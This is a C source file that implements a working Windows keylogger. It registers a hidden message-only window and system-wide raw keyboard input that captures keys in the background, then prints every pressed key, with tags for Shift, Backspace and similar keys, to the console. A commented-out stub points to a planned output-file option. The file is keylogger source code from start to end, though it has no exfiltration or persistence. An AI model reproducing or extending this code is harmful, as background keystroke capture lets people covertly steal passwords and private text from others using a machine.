#include "windows_keylogger.h"
#include <stdio.h>
#include <stdlib.h>

/* Windows API includes */
#include <windows.h>
#include <winuser.h>

LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam,
                            LPARAM lParam) {
  if (uMsg == WM_INPUT) {
    UINT dwSize;
    // 1. Get the size of the input data
    GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize,
                    sizeof(RAWINPUTHEADER));

    LPBYTE lpb = (LPBYTE)malloc(dwSize);
    if (lpb == NULL)
      return 0;

    // 2. Get the actual data
    if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, lpb, &dwSize,
                        sizeof(RAWINPUTHEADER)) == dwSize) {
      RAWINPUT *raw = (RAWINPUT *)lpb;
      if (raw->header.dwType == RIM_TYPEKEYBOARD) {
        if (raw->data.keyboard.Flags == RI_KEY_MAKE) { /* Only pressed events */
          UINT vkey = raw->data.keyboard.VKey;
          UINT scanCode = MapVirtualKeyA(vkey, MAPVK_VK_TO_VSC);
          char keyName[64];
          if (GetKeyNameTextA(scanCode << 16, keyName, sizeof(keyName)) > 0) {
            if (strcmp(keyName, "Shift") == 0)
              printf("[shft]");
            else if (strcmp(keyName, "Space") == 0)
              printf(" ");
            else if (strcmp(keyName, "Enter") == 0)
              printf("\n");
            else if (strcmp(keyName, "Backspace") == 0)
              printf("[del]");
            else if (strcmp(keyName, "Tab") == 0)
              printf("\t");
            else if (strcmp(keyName, "Caps Lock") == 0)
              printf("[caps_lock]");
            else if (strcmp(keyName, "Esc") == 0)
              printf("[esc]");
            else if (strcmp(keyName, "Ctrl") == 0)
              printf("[ctrl]");
            else if (strcmp(keyName, "Alt") == 0)
              printf("[alt]");
            else
              printf("%s", keyName);
          }
        }
      }
    }
    free(lpb);
    return 0;
  }
  return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

/*if (argc < 2) {
  // TODO make output file
  printf("Usage: ./[PROGRAM NAME] [OPTION] [outputfile]\n"
         "Option 1\n"
         "Outputfile as an option if you want to log your key inputs\n");
  return;
}*/

void windows_keylogger(int argc, char *argv[]) {

  /* Describe data we want & register keyboard */
  HINSTANCE hInstance =
      GetModuleHandle(NULL); /* getting the programs process ID */
  WNDCLASS wc = {0};
  wc.lpfnWndProc = WindowProc;
  wc.hInstance = hInstance;
  wc.lpszClassName = "HiddenKeyInputClass";
  RegisterClass(&wc);
  HWND hWnd = CreateWindowEx(0, "HiddenKeyInputClass", NULL, 0, 0, 0, 0, 0,
                             HWND_MESSAGE, NULL, hInstance, NULL);
  RAWINPUTDEVICE rid[1];

  rid[0].usUsagePage = 0x01;        // HID_USAGE_PAGE_GENERIC
  rid[0].usUsage = 0x06;            // HID_USAGE_GENERIC_KEYBOARD
  rid[0].dwFlags = RIDEV_INPUTSINK; // Receive input in background
  rid[0].hwndTarget = hWnd;

  if (!RegisterRawInputDevices(rid, 1, sizeof(RAWINPUTDEVICE))) {
    printf("Failed to register input device\n");
    return;
  }
  printf("Keylogger started\n");
  /* Message loop */
  MSG msg;
  while (GetMessage(&msg, NULL, 0, 0)) {
    TranslateMessage(&msg); // Translates keystrokes into characters (WM_CHAR)
    DispatchMessage(&msg);  // Sends the message to your WindowProc
  }
}
